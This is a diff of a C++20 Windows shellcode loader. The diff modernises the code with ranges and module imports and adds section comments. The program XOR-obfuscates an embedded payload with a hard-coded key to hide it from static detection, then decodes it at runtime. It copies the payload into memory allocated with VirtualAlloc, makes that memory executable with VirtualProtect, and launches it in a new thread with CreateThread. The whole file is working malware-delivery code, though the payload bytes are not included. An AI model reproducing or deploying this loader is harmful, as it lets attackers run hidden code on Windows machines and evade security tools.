@@ -1,40 +1,45 @@
-#include <windows.h>
-#include <print>
-#include <array>
-#include <span>
-#include <memory>
-#include <string_view>
-#include "generated/payload.hpp"
+#include <windows.h>                // Winapi -------
+#include "generated/payload.hpp"    // Raw payload --
 
+// -- C++20 module imports -------------------------------------------------------------------------
 import lbyte.stx;
+import std      ;
 
-using namespace std;
-using namespace std::literals;
+// -- Namespace aliases ----------------------------------------------------------------------------
+using namespace std       ;
 using namespace lbyte::stx;
 
+namespace vw = ranges::views;
+
+// -- Symmetric XOR transformation -----------------------------------------------------------------
 constexpr auto crypt(auto arr, auto key) {
-    for ( auto idx : range( arr.size() ) )
-        arr[idx] ^= key[idx % key.size()];
+    const auto keystream = vw::repeat(key) | vw::join;
+
+    for ( auto &&[byte, mask] : vw::zip(arr, keystream) )
+        byte ^= mask;
 
     return arr;
 }
 
-constexpr auto key       = "patatas"sv;
+// -- Compile-time key and payload transformation --------------------------------------------------
+constexpr auto key       = to_array(u8"patatas");
 constexpr auto shellcode = crypt(payload::data(), key);
 
 auto main() -> i32
 {
-    auto sys_free = []( u8* ptr ) noexcept {
+    // -- Resource cleanup callbacks ---------------------------------------------------------------
+    const auto sys_free = []( u8* ptr ) noexcept {
         if ( ptr )
             VirtualFree( ptr, 0, MEM_RELEASE );
     };
 
-    auto handle_close = []( u8* handle ) noexcept {
+    const auto handle_close = []( u8* handle ) noexcept {
         if ( handle and handle != INVALID_HANDLE_VALUE )
             CloseHandle( handle );
     };
 
-    auto exec_mem = std::unique_ptr<u8, decltype(sys_free)>{
+    // -- Allocate writable memory for the payload -------------------------------------------------
+    auto exec_mem = unique_ptr<u8, decltype(sys_free)>{
         rcast<u8*>(VirtualAlloc(
             null,
             shellcode.size(),
@@ -49,11 +54,13 @@ auto main() -> i32
         return EXIT_FAILURE;
     }
 
+    // -- Copy the encoded payload into executable memory ------------------------------------------
     mem::write(exec_mem.get(), shellcode);
     crypt(span{exec_mem.get(), shellcode.size()}, key);
 
-    println("[+] Payload copied successfully on: 0x{:X}", rcast<uptr>(exec_mem.get()));
+    println("[+] Payload copied successfully on: {}", ptr{exec_mem.get()});
 
+    // -- Enable executable permissions ------------------------------------------------------------
     auto old_protect = ulong{};
     auto success     = VirtualProtect(
         exec_mem.get(),
@@ -69,8 +76,9 @@ auto main() -> i32
 
     println("[+] Creating thread...");
 
+    // -- Launch the payload in a dedicated thread -------------------------------------------------
     auto thread_id = u32{};
-    auto h_thread  = std::unique_ptr<u8, decltype(handle_close)>{
+    auto h_thread  = unique_ptr<u8, decltype(handle_close)>{
         rcast<u8*>(CreateThread(
             null,
             0x00,
@@ -87,6 +95,7 @@ auto main() -> i32
         return EXIT_FAILURE;
     }
 
+    // -- Wait for execution to complete -----------------------------------------------------------
     println("[+] Thread {} initialized. Waiting for execution...", thread_id);
     WaitForSingleObject( h_thread.get(), INFINITE );
 
